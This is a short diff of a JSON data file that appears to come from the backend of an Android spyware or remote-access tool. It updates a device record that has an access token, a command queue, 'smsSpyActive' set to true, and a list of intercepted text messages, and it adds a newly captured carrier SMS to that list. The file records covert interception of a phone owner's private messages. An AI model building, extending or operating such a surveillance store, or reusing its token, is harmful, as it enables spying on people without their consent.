@@ -2157,7 +2157,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777768592607,
+    "lastSeen": 1777768595589,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -2173,6 +2173,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "myIM3",
+        "content": "Hampir aktif! Lindungi nomormu dengan Anti Spam sekarang, gratis tanpa biaya tambahan. https://myim3.co/antispam-sa",
+        "time": "03/05 07:36",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777768597715
+      },
       {
         "appName": "Messages",
         "sender": "IM3PREPAID",
